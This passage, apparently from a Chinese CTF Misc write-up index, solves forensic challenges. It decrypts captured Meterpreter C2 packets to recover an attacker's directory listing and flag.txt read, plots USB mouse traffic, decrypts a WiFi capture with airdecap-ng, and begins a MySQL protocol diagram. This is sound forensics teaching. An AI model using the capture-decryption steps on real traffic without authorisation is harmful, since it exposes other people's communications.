DECPAK(\"7e30af14889a3097540fee2bc847dab7e317cf9a7e30af157e30af7c7e30af144a1999b733e68b894ee6b64581a31e4f800f1e2413c6ffabc4690df0ffdf5ad592f3d3de710b43f85611c113dff2d03a4a91fc6cf046cafc37d823f986dee137e05368e717be6acbd31e87435f8bc7601dae969be7b5888050246f2f01b9cab8\")\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef54b835d361e2e784b4e2e9168aa4cd074c5b434009388fb2550a98ee6d49ea108c50b1f1b6c4c17a6fa0b01cd5e04f5fe5ba536da008841f20cef4324fe752f92923ea05e1d683bf991306b6878e301a68c933579c58c47482afc576545cc3cc2610d3f2ee70a3a36404996ff877b3a7756efe57bd043ad32f04ca9a137846cfeb6f53c817f32986117c0f26fc30b60b70a1f072987c80eda747fcc5ae85da2ed3\", AES_key)\n\nprint DECPAK(\"2926993adf8c06b90319d8059f51ec99b401f9b42926993b292699b22926993b0438eb2dc77a917a03839c6bb9f6afb8192bbf8baf251e45d7f08cb799975ab8c4661cee35f7d4c9c63b7d1607fabdd602313a66d04c4fe8570ddd650eb2e9595358f04c0e781a347ddb62027dea0a0e899709fa3eeaa238600e4abb48d28fce74817d9ce4a627d36b5ee9e9d59719e4ae246ef1d39f8468dbe5ca236dbee597\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef54a64307198e637c0fd0dfc74aad3b1fbcd26e62d8113e05e6af14d5cf78b82c11a0761ba6e95a984da59db055e44b9d5830cf6ec34a0e7ff0686fef9472546c93cd169eebf86e933f424f8a6f116bfa447a286bed01168019eb59eb83f5d455be5bf7fe55c49db5e7752b9b3135d1a4ccb6da5ca2c37af0c9311e6e335bc57642debf54952abd91b589527436429128a062f587edf20a215bf4161253898cc89a146c92c77cc6b34dd782f97007444f674dba89901758b8a7e55f1c82c7f0f0af78b41bae90d0d008518668d7fadf570da991365e09048b70d162b0e0b281cc28df2b64e759e480fa3dab1bb8635f85237205c66d6926fd85c829921956403b454598d57a7185ec80ea7ca1a8494d3c6ed7b7580dfbaaa585f018ca8c8efd5dd15b38e9281c3fc0385312544d7f24cb0fd3e8392fce9f07501028be0b6fa656dccb9247ab9b99fd3ff8cc04199d26398ea7fb4fac7be96769c8fa5f7e0d63cc524f0699104e89c91411d5a2168bbd7b59237b65143f81107667fddc2ba0e5c5382cf4dd672950da2ee088ba8e74039e872d89e69aeca904dac87463bb691075cd888a93d07c9ca792ffc53bd25a8487389a1776ffdfc4232028ea08d5f555d7738574ddd942d95d7cc5d0b086798c991ed140c72257b039a7aa8b61727976c6cd939b3815a4e04e94bafe8d5cb69f9dc11930431207ddc03517ccfd5e4499609b87914c40be1481a5ef174a45ce0fa70e8f6a683a2975a1b6b1905613444dac3ba12e8902d41f6ba2e7c940e347a6fdade78c6560e79f2f2313a90b74af7c1137e0bb3cd9f721af2a13deade2551a4be241b095992a608fb0e5aa063a10207414c2f2c18f7272bcffe0ecac0cfa8b4c2bf2bb3232044cccecaf91ed310d07ca1c\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef5415d984862f64b0e891b131ecc5d2a06c8ec29332954025fa1b2807cb007edcb73bba65e5c12cb31a40db6b26a4fa05a8d3e5a67d3871228a8cd6b6f6ce75a263823fecc17be818e1bd27a4cc9d512372e5f2f58f0aea4a11bfb631ceee791e0f5682f4dd94fc8b1aa59514037a8d76ff8b8d72ca32c2a299049f9089f430e403b9c64419d1eb8b6577c440bec9a16a5c51081ad4040fa32759ef37740c20a1a3893f511b08d37926ae67abedfa4084d1c3cb97f47a130dea915cd000fb51873c\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef549568c9bca4f5201e93dbdb4852d51967a2e9b23cc1a88ce4b2a37950450a8586cde6043906b7803994a8ce6db44ede0258b2b5d29318145c26075ddb963991ad85007119e0ad4de637818aa78e8fbe14631c113894ff87aefc336a427eb6c90cfc4e8b2efb088d63c1a301381cf90270e2b7c96371530800724ed4762f963d17b9ce23ab12cc4d656fbfc999d144f5f7cedee8eb9cc56200d51bede00a242bea\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef54e1a628a81569018cd0f5bf315d7b320e5b77b0f8b8345c79e0fc4594a74a390315f368d3c474883c2aa91a6e0573ff936f5bb5aba31790051bb71dc50bba249affef1b06d4fa9d297abbc5142c40a90d031af7e4cf885d6ad3e09bc0338a8d0e8675b7f332797ec9d87c48b37e8a2e3a75c8f80d78c3de96029eb298203090029a32a858b55714fb5a805dcd52c02734d04d04285f729285ba731207c73ee0c7c2ef52ecb3e973e787cce4fd720c83a3a221f8a98de6180c939785c52fec692acb34f3cf2a36de23a850928dd405afd0abd376c4dac3582153ea8de6e3cdf19fd4706688782e9a48b8b05c591abcc892555e2a061601f73a3498bdcbd1f1baf142a6471065d42312b48ded576689a1bb5bcdb877e8160995be495603a4405e2a2892f2b650760640286b1ad93461909518fd8392929e251157b0c5461825badfa065a42bb12b60bb7bc0fdbd62bc376b188f705e76820e832c0226f536b0c2620ab917dbebb346c9bf01c2a0c81832fed64e6f64407d3d7f051c6c8460900c50d2d8c361f57afb5958888c1bf983bd314ea54697d87ce70b9230837a98398b4d1cba073b86615712078079362f6fb1b0c80e2b25af230ce8016a0b0115607f730195f0811d21db64cc422e5b0f73d6fbcc88a0843fbdbed51db87851c940c99e4a0d72d3fa7604caf585b40b962f93cbd252373b78bbecf891975d8e152358534d999fe0008453b9f6952acccdce89d2f31021f67b5d4ae2099ff7b38d92a9f2f7541e9fcf9a89d9b8146dfbee579bfbd933ca07bb7ba04efda4c24cf5e9ca43afdd5bdaea05677fd293bcd74c31b37b24196f8e0d0be9e79831f7794ea91a52db03e8f35230ed75adbb5a0974380905b510883af3be066a03b984af5effc060\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef54a74abf08695adaad8be818da14b4dadc981f6157553f5d955e82e35ff422847f969300e94f38c7ec84dcc4fef465f3e62b0fbc142e3761c036cdfe4c5e7a880445ad31a51ee1112a89fec6e8693852d739fbd91d05327c0d6cda8cb26a17c3ae9b43f28774f991afb2545a69210f47d82339c219d7f7bfbd5d76c2a4a82e376ef1d2ff1142a0713b1e055bd6c6c78866e4da63c65cb6d161da9d55222c90984a6295e5b68bf4dce2ce684b9d067c02352b8f3fa457783c911a340f2b9c552fa6\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef545042629ac50792c2d9f387304e12245dcb7bc137fcf865d9548f52c1f4b4d7662a2e5b4a04ce32d51bdb99b725807534a9b288fdcce5512a4801b71d7a97de1624de6175b884a4ef080e2b8b39683a98d86cb9ff8ce0e1c1c7300fc582f2ed5d8f8a2b23b77ddb01e65e059738478f9aab61ec7e93f8f17eb1903786ae1c654edaf7ca60cd5c4d7012bffea32c54f5091952d4ddf7573efe77bda7d974bc4bb3\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef54a0c32aa9adca2454808fa09531321b03dade8023acab14d49f4bd36589277683be8ad1f5483cff7411c3db741baca849b7647a94650614d5ca05acadffd7ead06a172d74f279bbcf94a7c1365a1f6c624ae42f39644511bcecdddd516ba7e64280b6ee9300837628b207057b3c1d67abace40bb66ea250c438daac90110725da12c7b4fdca846a84ff3c842355eb5ae9c5814a83f0266e8e304b7c18c99ee2e6dddba999ef6c16bd459f7e5e0133a89f93c139887816477b133e70e333fd2c8187c39b504d983dded4b8d2ed57124dd564ecf36212a8208864dbaa756317d084d85a54066fb1179efb7e1d2ae41d49e5f79691f83676cd6d9d9f7e69ef5be859398c00bbed2dae001f80f7e784ed3ecd37e860a1a0b7eada9cae6cd34a78fd383ffb006597de7a427cf3fe2109edbbc9bbd8a4e58b7e9137c836b0ee899e8228c536e78664cf6f1626a298b635250d1e3c8b67dc33ce96ad33d8562e7bbc2eac3b0268aaec137377fa29542af2ffb940ad168fa6bc28a24d671c71432ac557026f7bd6cb5c4a3d6295ba03f9732138b74c6c0190c6d03cc65ec7ff90dbbd6a033d3d8f464af5523ddc1eec87f4a8920204bea066b62463f7055fc3a3443eb6831e068ff7c7884534c8c961b59ab638cc2c68f996c1e04938e6b36982940470775a8d67842d62db2a8fa297057816e3c1a8494ab8d8605cd363e7b02398f9462b29d4c6ae6d054e34df2de2960da4d2ecdc03da04a8b8c0f0429f5b6d69f654f895d39d538d772a54aa99e6ff4c9f2553a8d562e67de80bb6ce6f7b64f4a15006a97f3e356201b0ec1f35cb01d8e3121658f2f07db46174c1332dcda43e11ea9aab1d6da405ddeea61ebaca8db07aab89dbc971a107144f77d1e34fa5d162da5a\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef547eeb277e493e9d2dad9be2f9bb47f0b6355a47223f26e74ea01c55dbd02f3a256bebb806798caae2813f140c39b000a2b8d366c28b88bf92e71ba5760993884f3661f258cac484858353a5e430f20ab1ea10e2b9d58a92d395804ac305c8620cc25a0e41c33543723871e32dd2551b740e083d9524d8ab912d7d33ebc574ac103aa3b6d960d6812a40eb371be855151846d027dac6694e01d3ce26bcb648309c721316d0baf1c167a1ff4f21181a4f45fd1bb8b4219047d7cdcbbc0befff021c\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef5416d7e52b7aafb3d98d01695ad4dad9c844c16f1f5ab9c6524bd888fa10316d0f8cc027e58ca6abac24105f2b006c5c1687ee80da56344e9915c81c88195897056dbe672a7d5ed6060ca3b079edb8bd7c7137ba8f78160c16fec5ce685439cebd31761f47527f04cf840da0cdb430e5f71f13c6bd45ee04e8aa6670c2f3265b8663c1c9b600f68afd7b943ae566f9e9bf8eab2ea9714bf1fdce89e89e522af060\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef549ed176f02b7f872de8b1a1c09035e4c445e4eefd55f8b21766398cebdbbbac51638200564e211698faade01639890646b5a7df93dbfe2ab6fed342d53fe139f6d698075298003c873a3b394d52d5fa2db04ca3ced01e26f505a9dae196e528cf229390e572fd3c4f49712d4552f182e903e4cab21880065813920d8eb27d40a57b691a8cef7e83abaaec5b6d27b653942481771236a9e1fa96de9fa7013539f4f51a632c7d5377087c1e5ff04ece37e31be0201d8acb15f3ffea099ba7161a8b099fe436babe9ec972f5acd7b1b13c8fc63531a0e48613fe0828f70263c21af801c1cdbae91dc7f05dfd348e9120230dbbe52dfbc7d6f4ff4281a26e04d64ac17be5ffdd46c38bfd4d5f23e536bb976210e764922a9fa1a4a0d32676c2a3ae77376b0fdee2e484877cca94e36d38b7fe4370ab2cd24dd1c1daf37a3025b82c4cdd43808997fbab7ae1bbfb38039f225f238a05c7a43d75d325964cc8709d06e4a0201760bd978ae7719af4f44bde5e55bcfd4cb5e20f71fb9c2ac3bf71eb7b4552f1ea466e11218b291d2311344e72232c71286fc1b41464aff44975bda745c78ae7309c1c6cafdc22833de0585e879d8fa1257421c6372cf5d6159eb927a64b32b4a26f93e119983e1b75dcb51588d666ce3f66078a9f9ed1b843bd82a0d8ba2020869fd49ef9434610961c7d95ce2e43cdf3b4d8cf1a1eaeadcfc0deb5651a6af86cecce1ab15172160eb25c17421e65d34e4efbdd6917860610360b662aa4d7e3fa62157ab07d1e2a2af88f1387fd82df72155f0602ece0ce617215c5bef59a393e0d7cd2572d848510c5c09c78916d6240778f2d2efead1dd1795096554a8100d61bcf1a7d51e5fd22e9633d0673268745990827da0027c7812fbdefb0d1\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef54f6cf111c29995e8ddf9cfc68568b392a827cbd823b57a5b72e8a5befc5581afc9a3d62dc240ec020910740d3d782ec0d25232da13f1f1634569d749562e8e9c65de0016af28faa98409554e21b7932eb5587670935ddc66138139828832adb339b6e390090432eb4ea1f292ad9918345903aae300c1ece3e8e04b19d3a95856d908975f370b4e4dbb054f7d2b62325e95578df134e23e15478855f5015318f78d6e5cf9ea0808207153432f12f6c916dba4d73a5b603abd5944ff81873278e0c\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef548a457a00a50fdd743b833ace6e884f5e1ee7d93e1d5465013006b47661b78a31cb121fddc9cad7539a91d2f876775063efb3517bcadb658160ec961b4482cd1ef4ac797936a9061a48318c67ff7e5d2055f8d2b0e7e5fbca0fef43935e23afe3daaee2c0400d950f96c2a41e3a36dc82b6f02f8ce2031d95fee1c4129e3b11e352afa470bc219fd9ebc0f70cec328071cd9ee9c423559debc72a4b82997bcf72\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4eddd2ab4ef5417935c499443c593861b309077d9bde14d10e835529bf1ae2d48cf5eb8732fe500780aef921e1e4c9d42400ef3aa0d8642e9a53a17cc4115093bdfe64b15af6ddb9ba8a928e8aee3c693712a25cc9776956dd2bd88e2eb1b340e49c7c06004025d4018b5cb963edb72d36335c0e46599684bbacba9be975919d374cf36f8036bc85dc7b6eb28f2db271d89f2a6884850fba6a4223a607cfc6ea27ad5967fbf111193c80dc5651e5875bdde2590d3759c6229012c82f571bac7e9c34278a2c6510c5440a563282078f75437a6b83a2795628747c8a42cd1962d5892a301f240fa0ab2ff2ffdc37fd9c31681c7be58bb211fa2a65656612936aee9610785fba11a8fb5eeffecffd28da7257a06147b8b3f7b4840b9e14ff58a62de5d895a72192db8da9bc8eab0018dba287c2259a2424ef2c07320ecf8333bad402ed073fdfec3a9074e4ac483adffaae6827363292969b0a8b667ce87608c280eea0d588636862e7c685a1098c4cfe5be6ced796dcb68a13dc8d627c0a1507f29118c873538eca45775ff552df3caeeffd83dda2b690c577a4ac2a6b2ee1fb6292f30b92f653817b1347a2511f4ce6b16b8b326561788207153b8e34abe2c01f18084c39d8d112f30abba79c18fd41364dc6569700ba8e50bfd3698c364c980185e41983b5b8a2123e05c8d2d20e8ff344d45eba3a696c168a41828e89dfd52b933ae2fda939115e33388f8d001f222968cdff85014df2a13012e8ed2de7b7e344016a31fe040c4f499b11405331825d792889f6ff88de901bb22c63b3b2ed03230f466dcfd266b9de98a9555e55612be2488cd4725d8dbc082821d5de0579c71755d2f1546e88eb20a0f4bfd15d6ee97a560e73fd9a428af958e2d8f4359ddb89de5d02e387a\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef9d2ab4ef54673f20ea63ed7dcee5ad41191624f11654116ea6e529188198f3d8c99fb8c7a4cd02d95c775fcd228293c4e07f457fff20f4dd86beecd707729f7e320557c541568e499880bd3d60edd8d517ef847314fa92add61d1ebad74bb38fe874defc674d5c0a185089963ec494879a56af9fd814a476e41e057c4c1a00a9d1f69e1b7c45bbb769791636ae9a42514c366eee52f9f5346c92c6fa9138845f0c3eaf3a30f3f71c048ee4f9fd3e5dec452cde0bf13794ad43c7c7334c1b841294ed61d3bc\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4effd2ab4ef54bf7b08dd116835468ca87c273505a310dab1059bfd1ba816574d1e3f35f8429788dccf3848b0872bfc5b5d149ca192532ee30b2291bb57fca70ed1fb4f7653445f1c373a74f0e324ea23efdf3c3be17aa51821c4fac4a2b26f73f7ac306ad49b7cbaf5edbdd2e9962a1ee0d3127ae049a5823e8f2ab88879dbb679f37323e1497fdea2d807af51c94a7f8a9a27dbffcc65ee8778848a5315a994b9a7c71c914d\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4efcd2ab4ef543db8b8d5acda5a1235b3ad7d07db722102cd9e53750cef7e31131b2d59afa2206d5adc9c877d8ea88bef37dfdff1ffe46e42443d29429793ab306042ee0b2173de2b24e750a0ec61eae0fb8dc5ba0c9961330cfc253aa550022cbf03120d8561e96d54ff94e08ca352d1c069065caceb101e16845fe69db34893f8cb9f3c1e7749b573c1e3f4f2caf2486620cab399fd\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4efdd2ab4ef54e28b751ce10cff077f8445dfe8ddc32363ccef83833a6e9c72f75026116d0253b77e884b483db4b28ab58a9397911ed8afd892a938b4eaee9806d96c070f1f1e587bca16e8e8e16e2b2af5a530e84cc95221f13ce3c66b391318c11f6740bb16d7216dbf70004cbdf4e451b13cb70223235f7e63a33d32c631f512bd5ca7511b\", AES_key)\n\nprint DECPAK(\"2ab4ef55dc1e70d6008bae6a9cc39af6b7938fdb2ab4ef542ab4ef8d2ab4ef549df15c8d63e084ea41796e1080c422c10c4af26c0b5563cb3058bd6e4aa3f2cc22de1c6edf7e6468ad7e1ff8fa11bd0d2955218906c89bc9c1aca68485ba41d6c1363d26e1ca77e379eede5843a78cf2890a4a4d48d532564d081638df298d10b5b8e57b4714d29993407e26b857a054f18cbba0769a9d7a3ab9b2fc503b9b4e0f13e3e0e4086d9def861eb75b54df80426839c540b6836702d3585c1d11b1fcc1f56d6a2a58bee99fa22ea3792bd764075cdd0bfe11d2a7953c9174210b35afc3a38ab0ff13abebf06b74046bc902df\", AES_key)\n</code></pre> <p>\u53d1\u73b0\u653b\u51fb\u8005\u5bf9\u76ee\u5f55\u8fdb\u884c\u4e86\u7f57\u5217\uff0c\u51fa\u73b0\u5173\u952e\u8bcd <code>flag.txt</code></p> <pre><code>{'PKT_TYPE': 1, 'TLVS': [[24, 65537, 'stdapi_fs_getwd\\x00'], [41, 65538, '35193328683991905719198692993325\\x00'], [28, 66736, 'C:\\\\Users\\\\PC\\\\Desktop\\x00'], [12, 131076, '\\x00\\x00\\x00\\x00'], [24, 262605, '\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e']], 'PKT_LENGTH': 168, 'IV': '\\xa0\\xf1\\x95U\\x8f\\xbb2!\\x117\\xd5\\x9bD&lt;\\xa0\\x0b', 'XOR_KEY': '*\\xb4\\xefU', 'ENC_FLAGS': 1, 'GUID': \"\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d'`\\x8e\"}\n{'PKT_TYPE': 1, 'TLVS': [[21, 65537, 'stdapi_fs_ls\\x00'], [41, 65538, '92992205236495284461596905472999\\x00'], [10, 66737, '.\\x00'], [30, 66738, 'C:\\\\Users\\\\PC\\\\Desktop\\\\.\\x00'], [9, 66741, '\\x00'], [72, 2147484869, '\\x00\\x00\\x00\\x00mA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00\\x0f\\x18._\\x00\\x00\\x00\\x00'], [11, 66737, '..\\x00'], [31, 66738, 'C:\\\\Users\\\\PC\\\\Desktop\\\\..\\x00'], [9, 66741, '\\x00'], [72, 2147484869, '\\x00\\x00\\x00\\x00\\xffA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\x19\\x18._\\x00\\x00\\x00\\x00\\x19\\x18._\\x00\\x00\\x00\\x00\\x0f\\x18._\\x00\\x00\\x00\\x00'], [20, 66737, 'desktop.ini\\x00'], [40, 66738, 'C:\\\\Users\\\\PC\\\\Desktop\\\\desktop.ini\\x00'], [9, 66741, '\\x00'], [72, 2147484869, '\\x00\\x00\\x00\\x00\\xb6\\x81\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x18._\\x00\\x00\\x00\\x00\\x1a\\x18._\\x00\\x00\\x00\\x00\\x18\\x18._\\x00\\x00\\x00\\x00'], [17, 66737, 'flag.txt\\x00'], [37, 66738, 'C:\\\\Users\\\\PC\\\\Desktop\\\\flag.txt\\x00'], [9, 66741, '\\x00'], [72, 2147484869, '\\x00\\x00\\x00\\x00\\xb6\\x81\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x005\\x00\\x00\\x00\\x00\\x00\\x00\\x00?\\x999_\\x00\\x00\\x00\\x00\\x80\\x999_\\x00\\x00\\x00\\x00?\\x999_\\x00\\x00\\x00\\x00'], [12, 131076, '\\x00\\x00\\x00\\x00'], [24, 262605, '\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e']], 'PKT_LENGTH': 648, 'IV': \"='\\xb3\\x1c\\xbe\\xf7*\\xc6\\xac\\xaf\\xdf\\xc5]mR\\xb4\", 'XOR_KEY': '*\\xb4\\xefU', 'ENC_FLAGS': 1, 'GUID': \"\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d'`\\x8e\"}\n{'PKT_TYPE': 1, 'TLVS': [[23, 65537, 'stdapi_fs_stat\\x00'], [41, 65538, '81395400468542538926467524183079\\x00'], [72, 2147484869, '\\x00\\x00\\x00\\x00mA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00C\\x999_\\x00\\x00\\x00\\x00\\x0f\\x18._\\x00\\x00\\x00\\x00'], [12, 131076, '\\x00\\x00\\x00\\x00'], [24, 262605, '\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e']], 'PKT_LENGTH': 200, 'IV': 'M\\x8b\\xcf\\xbfIY\\x92\\x9b\\xcf\\x19\\xaeL&lt;\\x90\\x1eC', 'XOR_KEY': '*\\xb4\\xefU', 'ENC_FLAGS': 1, 'GUID': \"\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d'`\\x8e\"}\n{'PKT_TYPE': 1, 'TLVS': [[24, 65537, 'stdapi_fs_getwd\\x00'], [41, 65538, '65703151916968344032521729631525\\x00'], [28, 66736, 'C:\\\\Users\\\\PC\\\\Desktop\\x00'], [12, 131076, '\\x00\\x00\\x00\\x00'], [24, 262605, '\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e']], 'PKT_LENGTH': 168, 'IV': '\\x95\\xcf\\xe7\\x88;\\xdc\\xda\\x13\\xa6\\x1c\\x93r\\x1f\\xb1LE', 'XOR_KEY': '*\\xb4\\xefU', 'ENC_FLAGS': 1, 'GUID': \"\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d'`\\x8e\"}\n{'PKT_TYPE': 1, 'TLVS': [[27, 65537, 'core_channel_close\\x00'], [41, 65538, '58287235164616228196360033701482\\x00'], [12, 131122, '\\x00\\x00\\x00\\x01'], [12, 131076, '\\x00\\x00\\x00\\x00'], [24, 262605, '\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e']], 'PKT_LENGTH': 152, 'IV': '\\x17\\x0cW\\x80\\x86n\\xb5G\\x1f\\x07B(-o\\x9dt', 'XOR_KEY': '*\\xb4\\xefU', 'ENC_FLAGS': 1, 'GUID': \"\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d'`\\x8e\"}\n{'PKT_TYPE': 1, 'TLVS': [[25, 65537, 'core_channel_eof\\x00'], [41, 65538, '68965028063958896069137527866199\\x00'], [9, 524300, '\\x01'], [12, 131076, '\\x00\\x00\\x00\\x00'], [24, 262605, '\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e']], 'PKT_LENGTH': 136, 'IV': '\\xc8?\\x9aI\\xcb\\xb8\\x10RU0\\xaa\\x8a\\xc2i,v', 'XOR_KEY': '*\\xb4\\xefU', 'ENC_FLAGS': 1, 'GUID': \"\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d'`\\x8e\"}\n{'PKT_TYPE': 1, 'TLVS': [[26, 65537, 'core_channel_read\\x00'], [41, 65538, '51236609532627967781124094944166\\x00'], [61, 262196, 'flag{Meterpreter_Has_A_Greater_Enc_Method_Than_Shell}'], [12, 131097, '\\x00\\x00\\x005'], [12, 131122, '\\x00\\x00\\x00\\x01'], [12, 131076, '\\x00\\x00\\x00\\x00'], [24, 262605, '\\x12\\x1b\\xff\\xa3\\x15\\x98\\x0b\\x91\\x0e\\xbe\\x0f\\xbcQ\\x87\\x97\\x1e']], 'PKT_LENGTH': 216, 'IV': '\\xb7E\\xb3\\xd8ITk\\xbfk\\xcd\\x81E\\xaap\\xcd\\x94', 'XOR_KEY': '*\\xb4\\xefU', 'ENC_FLAGS': 1, 'GUID': \"\\xf6\\xaa\\x9f\\x83*?A?\\xb6wu\\xa3\\x9d'`\\x8e\"}\n</code></pre> <p>\u7ee7\u7eed\u67e5\u627e\u5c31\u53ef\u4ee5\u53d1\u73b0 flag.txt \u5185\u5bb9</p> <pre><code>flag{Meterpreter_Has_A_Greater_Enc_Method_Than_Shell}\n</code></pre>"},{"location":"Misc/Chapter5/5-3/","title":"\u9f20\u6807\u8fd0\u52a8\u8f68\u8ff9\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-3/#\u9f20\u6807\u8fd0\u52a8\u8f68\u8ff9\u9690\u5199","title":"\u9f20\u6807\u8fd0\u52a8\u8f68\u8ff9\u9690\u5199","text":"<p>\u5bf9\u4e8e\u8fd9\u79cd USB \u6d41\u91cf\u6211\u4eec\u91cd\u70b9\u89c2\u5bdf Capture Data</p> <p></p> <p>\u952e\u76d8\u6d41\u91cf\u4e00\u822c\u90fd\u662f 8 \u5b57\u8282\uff0c\u8fd9\u91cc\u663e\u7136\u662f\u9f20\u6807\u6d41\u91cf</p> <p>\u4f7f\u7528\u5de5\u5177 USB-Mouse-Pcap-Visualizer \u63d0\u53d6\u6570\u636e\u4e3a csv</p> <pre><code>python usb-mouse-pacp-visualizer.py -i 1.pacp -o 1.csc\n</code></pre> <p></p> <p>\u6700\u540e\u53bb\u8fd9\u4e2a\u7f51\u7ad9\u7ed8\u56fe</p> <p><code>https://usb-mouse-pcap-visualizer.vercel.app/</code></p> <p></p>"},{"location":"Misc/Chapter5/5-30/","title":"WIFI \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-30/#wifi-\u6d41\u91cf\u9690\u5199","title":"WIFI \u6d41\u91cf\u9690\u5199","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u6839\u636e\u9898\u76ee\u63d0\u793a <code>wifi</code> \u4f7f\u7528\u5de5\u5177 CTF-NetA \u641c\u7d22\u5173\u952e\u5b57\u62ff\u5230\u5bc6\u7801\u53ca\u540d\u79f0</p> <pre><code>ssid: MyWifi    key: 88888888\n</code></pre> <p></p> <p>\u4f7f\u7528\u5de5\u5177 <code>airdecap-ng</code> \u7834\u89e3 WEP/WPA-PSK \u52a0\u5bc6\u7684\u6293\u5305\u6587\u4ef6</p> <pre><code>airdecap-ng '/home/morant/capture.cap' -e MyWifi -p 88888888\n</code></pre> <p></p> <p>\u6267\u884c\u5b8c\u540e\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u7684 <code>.cap</code> \u6587\u4ef6</p> <p>\u7ee7\u7eed\u6254\u8fdb CTF-NetA \u89e3\u6790\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-31/","title":"MySQL \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-31/#mysql-\u6d41\u91cf\u9690\u5199","title":"MySQL \u6d41\u91cf\u9690\u5199","text":"<p>MySQL \u6d41\u7a0b\u56fe\u5982\u4e0b</p> <pre><code>+-------------+                                    +-------------+\n|  MySQL \u5ba2\u6237\u7aef |                                    |  MySQL \u670d\u52a1\u7aef |\n+-------------+                                    +-------------+\n       |                                                  |\n       | 1. \u5efa\u7acb TCP \u8fde\u63a5 (\u7aef\u53e3 3306)                      |\n       |-------------------------------------------------&gt;|\n       |                                                  |\n       | 2. \u63a5\u6536 Handshake Initialization Packet          |\n       |&lt;-------------------------------------------------|\n       |                                                  |\n       | 3. \u53d1\u9001 Login Request Packet 